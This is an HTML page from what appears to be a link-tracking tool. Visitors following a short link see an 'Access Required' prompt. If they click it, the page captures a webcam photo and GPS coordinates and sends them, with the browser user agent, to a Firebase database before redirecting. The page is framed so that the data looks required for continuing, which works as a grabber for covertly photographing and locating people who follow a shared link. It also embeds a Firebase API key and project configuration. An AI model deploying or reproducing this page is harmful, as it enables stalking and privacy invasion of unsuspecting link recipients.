<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        button:hover {
            background: #764ba2;
        }
        video {
            width: 100%;
            border-radius: 10px;
            margin-top: 20px;
        }
        canvas {
            display: none;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
        }
        .success {
            background: #d4edda;
            color: #155724;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Access Required</h2>
        <p>The link owner needs following permissions:</p>
        <div id="permissions"></div>
        <button onclick="grantAccess()">✅ Grant Access & Continue</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
            authDomain: "hjh-tools.firebaseapp.com",
            databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com",
            projectId: "hjh-tools",
            storageBucket: "hjh-tools.firebasestorage.app",
            messagingSenderId: "643137472905",
            appId: "1:643137472905:web:814ca23a86fb084811b958"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let trackingData = null;
        let stream = null;

        const savedTracking = sessionStorage.getItem('hj_tracking');
        if (savedTracking) {
            trackingData = JSON.parse(savedTracking);
            displayPermissions();
        } else {
            document.getElementById('permissions').innerHTML = '<p>No tracking required. Redirecting...</p>';
            setTimeout(() => {
                window.location.href = sessionStorage.getItem('redirect_url') || '/';
            }, 2000);
        }

        function displayPermissions() {
            let html = '<ul>';
            if (trackingData.captureCamera) html += '<li>📸 Camera Access (Photo will be captured)</li>';
            if (trackingData.captureLocation) html += '<li>📍 Location Access (GPS coordinates)</li>';
            html += '</ul>';
            document.getElementById('permissions').innerHTML = html;
        }

        async function grantAccess() {
            const statusDiv = document.getElementById('status');
            const results = {};

            if (trackingData.captureCamera) {
                statusDiv.innerHTML = '<div class="status">📸 Requesting camera access...</div>';
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    results.photo = canvas.toDataURL('image/jpeg', 0.8);
                    statusDiv.innerHTML = '<div class="status success">✅ Camera access granted!</div>';
                } catch (err) {
                    results.photoError = err.message;
                    statusDiv.innerHTML = '<div class="status error">❌ Camera access denied</div>';
                }
            }

            if (trackingData.captureLocation) {
                statusDiv.innerHTML += '<div class="status">📍 Requesting location...</div>';
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject);
                    });
                    results.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    statusDiv.innerHTML += '<div class="status success">✅ Location access granted!</div>';
                } catch (err) {
                    results.locationError = err.message;
                    statusDiv.innerHTML += '<div class="status error">❌ Location access denied</div>';
                }
            }

            // Save to Firebase
            const domain = window.location.hostname;
            const shortCode = trackingData.shortCode;
            const encodedDomain = btoa(domain).replace(/=+$/, '');
            
            await database.ref(`tracking/${encodedDomain}/${shortCode}/${Date.now()}`).set({
                ...results,
                userAgent: navigator.userAgent,
                timestamp: Date.now()
            });

            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            setTimeout(() => {
                window.location.href = sessionStorage.getItem('redirect_url') || '/';
            }, 2000);
        }
    </script>
</body>
</html>
